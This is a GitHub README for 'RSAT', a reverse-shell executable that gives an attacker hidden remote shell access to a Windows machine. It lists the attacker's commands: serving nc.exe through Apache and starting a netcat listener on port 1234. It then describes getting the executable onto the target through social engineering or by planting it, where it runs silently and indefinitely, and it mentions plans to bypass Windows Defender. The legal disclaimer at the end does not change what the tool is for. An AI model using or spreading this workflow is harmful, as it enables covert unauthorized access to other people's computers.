



# RSAT
![RCAT (1)](https://github.com/LostOliie/rsat/assets/137381675/ad3fe0d3-2e62-4a7d-8639-d6911024d68e)
**Reverse Shell Attacking Terminal(RSAT)** is an executable application which can be used to remotely access _a target computer_ from the _attackers computer_ using a service named as **netcat**. **RSAT** is currentely only available to **linux based computers and windows based computers.** Essentially, **RSAT has simply automated the netcat service and made it applicable to** _the backdoor of the target system_so that the user does not know. **RSAT** is a part of the LVSH project which is a hacking framwork  under development. The user must read the full README.md before using the program for smooth and appropriate use.


![RCAT (2)](https://github.com/LostOliie/rsat/assets/137381675/8c1c548c-8f52-463b-a054-a37a366e04bb)


# How does it work?
The attackers computer has to be  _a linux based computer(recommended kali linux)_ the attacking computer shall have netcat installed,

The attacker shall execute **the following commands in their terminal:**

    sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/nc.exe
    sudo systemctl start apache2.service
    nc -nlvp 1234

These commands **start a server and start listening on ** a port named _1234_, the output of these commands should be like so:

      listening on [any] 1234 ...

After doing so, the attacker must simply implant or send the target the **LVSH RSAT** executable into the target computer, then the hacker shall make the target execute it using social engineering **skills or the hacker can execute the .exe file ** when he _implants the file _.

After this the target computer will **not be seeing anything and the ** _program will run infinitly unless the system is restarted or turned off_.

Then the attackers computer will have access to the **target computers shell which the attacker can use to access the device :-)**

**NOTE: THE TARGET COMPUTER HAS TO HAVE WINDOWS DEFENDER DISABLED, THE LVSH PROJECT IS WORKING ON BYPASSING THIS IN THE NEXT VERSION., THE COMMANDS FOR THE ATTACKER ARE LINUX BASED ONLY WHILE THE COMMANDS OF THE TARGET ARE WIN BASED ONLY.*

# Terms & Conditions

Disclaimer: Legal and Responsible Use Statement

The following statement serves as a disclaimer to emphasize the importance of using any program, tool, or software for lawful and ethical purposes only. We strongly discourage and condemn the use of our program for illegal hacking activities or any malicious intent. By using this program, you agree to the terms and conditions outlined below:

Lawful Use: You acknowledge that the program provided is intended solely for legal and ethical purposes. You agree to utilize the program in accordance with local, national, and international laws, regulations, and guidelines.

Prohibited Activities: You agree not to engage in any activities that are illegal, unethical, or harmful to others. This includes, but is not limited to, unauthorized access to computer systems, data breaches, identity theft, malicious attacks, or any actions that compromise the security and privacy of individuals or organizations.

Personal Responsibility: You accept full responsibility for your actions and the consequences that may arise from using the program. You understand that any misuse or illegal activity associated with this program may result in legal penalties, including but not limited to civil and criminal liability.

No Endorsement: The program provider does not endorse or support any illegal or malicious use of the program. We strictly promote ethical conduct, lawful practices, and respect for privacy and security.

Educational and Research Purposes: This program may be used for educational and research purposes to enhance knowledge, improve cybersecurity practices, and promote responsible technology use. However, it should be used solely in controlled environments with appropriate permissions and consents.

Ethical Guidelines: We encourage users to follow established ethical guidelines and respect the rights, privacy, and security of others. Use the program to enhance your understanding, contribute positively to the field, and protect digital ecosystems.

No Warranty: The program is provided "as is" without any warranties, express or implied. The program provider shall not be held responsible for any damages, losses, or liabilities incurred by the user or any third party as a result of using the program.

By using this program, you acknowledge that you have read and understood this disclaimer and agree to abide by its terms and conditions. You further understand that violation of this disclaimer may result in the termination of your access to the program and potential legal consequences.

Remember, technology should be used responsibly, ethically, and legally to ensure a safe and secure digital environment for all. 



    PS: **PROGRAM MADE BY LVSH PROJECT AKA LOSTOLIIE **
